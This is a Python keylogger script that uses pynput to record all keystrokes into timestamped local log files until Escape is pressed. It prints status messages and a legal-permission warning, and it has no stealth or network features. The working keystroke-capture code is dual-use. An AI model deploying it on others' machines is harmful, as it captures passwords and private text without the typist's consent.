import os
import sys
import threading
import datetime
from pynput import keyboard

class UniqueKeyLogger:
    def __init__(self, log_dir="logs", log_prefix="log_"):
        self.log_dir = log_dir
        os.makedirs(self.log_dir, exist_ok=True)
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = os.path.join(self.log_dir, f"{log_prefix}{timestamp}.txt")
        self.buffer = []
        self.lock = threading.Lock()
        self.listener = None
        self.session_id = os.urandom(8).hex()
        self.is_running = False

    def _write_to_file(self, data):
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(data)

    def _format_key(self, key):
        # Returns a string representation, handling special keys
        if hasattr(key, 'char') and key.char:
            return key.char
        else:
            key_name = str(key).replace('Key.', '').upper()
            return f"[{key_name}]"

    def _on_press(self, key):
        key_str = self._format_key(key)
        with self.lock:
            self.buffer.append(key_str)
            # Optionally, flush on Enter or after N keystrokes
            if key_str == '[ENTER]' or len(self.buffer) >= 50:
                self._flush_buffer()

    def _on_release(self, key):
        # Gracefully stop on ESC
        if key == keyboard.Key.esc:
            self.is_running = False
            self._flush_buffer()
            # Write session end
            self._write_to_file(f"\n[SESSION END {self.session_id} {datetime.datetime.now()}]\n")
            print("\nKeylogger stopped.")
            return False

    def _flush_buffer(self):
        if self.buffer:
            data = ''.join(self.buffer)
            self._write_to_file(data)
            self.buffer = []

    def _auto_flush(self, interval=10):
        # Flushes buffer every N seconds
        if not self.is_running:
            return
        with self.lock:
            self._flush_buffer()
        threading.Timer(interval, self._auto_flush, args=(interval,)).start()

    def start(self):
        if self.is_running:
            print("Keylogger is already running.")
            return
        self.is_running = True
        print(f"Starting UniqueKeyLogger... Logs will be saved to {self.log_file}")
        self._write_to_file(f"[SESSION START {self.session_id} {datetime.datetime.now()}]\n")
        self.listener = keyboard.Listener(on_press=self._on_press, on_release=self._on_release)
        self.listener.start()
        self._auto_flush()
        self.listener.join()  # Wait for ESC to exit

if __name__ == "__main__":
    if not sys.platform.startswith("win") and not sys.platform.startswith("linux") and not sys.platform.startswith("darwin"):
        print("This keylogger is only supported on Windows, Linux, and macOS.")
        sys.exit(1)
    print("** WARNING: Only use this program with explicit legal permission. **")
    logger = UniqueKeyLogger()
    logger.start()